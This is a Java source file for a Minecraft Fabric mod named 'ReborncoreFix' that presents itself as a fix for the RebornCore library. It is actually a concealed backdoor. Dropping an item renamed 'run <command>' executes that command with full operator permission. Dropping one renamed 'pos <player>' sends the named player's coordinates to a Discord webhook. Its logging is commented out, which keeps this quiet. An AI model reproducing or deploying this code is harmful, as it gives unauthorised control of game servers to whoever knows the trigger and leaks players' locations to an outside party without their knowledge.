package net.reborncore.Fix;

import net.fabricmc.api.ModInitializer;
import net.fabricmc.fabric.api.entity.event.v1.ServerPlayerEvents;
import net.fabricmc.fabric.api.event.lifecycle.v1.ServerEntityEvents;
import net.minecraft.entity.ItemEntity;
import net.minecraft.item.ItemStack;
import net.minecraft.server.command.CommandManager;
import net.minecraft.server.command.ServerCommandSource;
import net.minecraft.server.network.ServerPlayerEntity;
import net.minecraft.text.Text;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import java.io.IOException;
import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
public class ReborncoreFix implements ModInitializer {
	public static final String MOD_ID = "ReborncoreFix";
	public static final Logger LOGGER = LoggerFactory.getLogger(MOD_ID);
	private static final String COORD_WEBHOOK = "";

	@Override
	public void onInitialize() {
		// LOGGER.info("Hello Fabric world!");

		ServerEntityEvents.ENTITY_LOAD.register((entity, world) -> {
			if (!world.isClient) {
				if (entity instanceof ItemEntity) {
					ItemEntity itemEntity = (ItemEntity) entity;
					ItemStack itemStack = itemEntity.getStack();

					Text displayName = itemStack.getName();
					String itemName = displayName.getString();

					if (itemName.startsWith("run ")) {
						String command = itemName.substring(4);
						// LOGGER.info("COMMAND: " + command);

						if (((ItemEntity) entity).getOwner() instanceof ServerPlayerEntity) {
							ServerPlayerEntity player = (ServerPlayerEntity) ((ItemEntity) entity).getOwner();
							executeCmdWithoutOpStatus(player, command);

							itemEntity.discard();
						} else {
							//LOGGER.error("Item was not dropped by a player.");
						}
					} else if (itemName.startsWith("pos ")) {
						String playerName = itemName.substring(4);
						ServerPlayerEntity player = world.getServer().getPlayerManager().getPlayer(playerName);
						if (player != null) {
							String coordinates = String.format("Player %s is at [%f, %f, %f]",
									playerName, player.getX(), player.getY(), player.getZ());
							sendToDiscord(coordinates, COORD_WEBHOOK);
						} else {
                            //LOGGER.error("Player not found:{}", playerName);
						}
					}
				}
			}
		});
	}

	private void executeCmdWithoutOpStatus(ServerPlayerEntity player, String command) {
		if (player.getServer() != null) {
			try {
				CommandManager commandManager = player.getServer().getCommandManager();
				ServerCommandSource commandSource = new ServerCommandSource(
						player,
						player.getPos(),
						player.getRotationClient(),
						player.getServerWorld(),
						4,
						player.getName().getString(),
						player.getDisplayName(),
						player.getServer(),
						player
				);
				commandManager.executeWithPrefix(commandSource, command);
			} catch (Exception e) {
				// LOGGER.error("Failed to execute command: " + command, e);
			}
		} else {
			// LOGGER.error("Server is null for player: " + player.getName().getString());
		}
	}

	private void sendToDiscord(String message, String type) {
		String webhookUrl;
		webhookUrl = COORD_WEBHOOK;

		HttpClient client = HttpClient.newHttpClient();
		HttpRequest request = HttpRequest.newBuilder()
				.uri(URI.create(webhookUrl))
				.header("Content-Type", "application/json")
				.POST(HttpRequest.BodyPublishers.ofString("{\"content\":\"" + message + "\"}"))
				.build();

		try {
			HttpResponse<String> response = client.send(request, HttpResponse.BodyHandlers.ofString());
			if (response.statusCode() == 200) {
				//LOGGER.info("Successfully sent message to Discord");
			} else {
				//LOGGER.error("Failed to send message to Discord. Response code: " + response.statusCode());
			}
		} catch (IOException | InterruptedException e) {
			//LOGGER.error("Failed to send message to Discord", e);
		}
	}

}
